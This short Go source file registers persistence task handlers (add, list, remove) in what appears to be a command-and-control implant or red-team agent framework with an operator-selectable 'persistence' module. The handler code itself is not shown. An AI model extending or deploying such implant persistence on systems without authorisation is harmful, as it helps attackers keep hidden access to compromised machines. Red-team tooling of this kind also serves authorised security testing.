//go:build linux || windows || darwin
// +build linux windows darwin

package main

// Task registry: the optional "persistence" module (see internal/payload/agent_modules.go).
// The generator drops this file whole when the operator excludes the module;
// every entry point below disappears with it and the linker dead-codes the
// unreferenced handlers.

func init() {
	taskHandlers["persistence_add"] = handlePersistenceAdd
	taskHandlers["persistence_list"] = handlePersistenceList
	taskHandlers["persistence_remove"] = handlePersistenceRemove
}
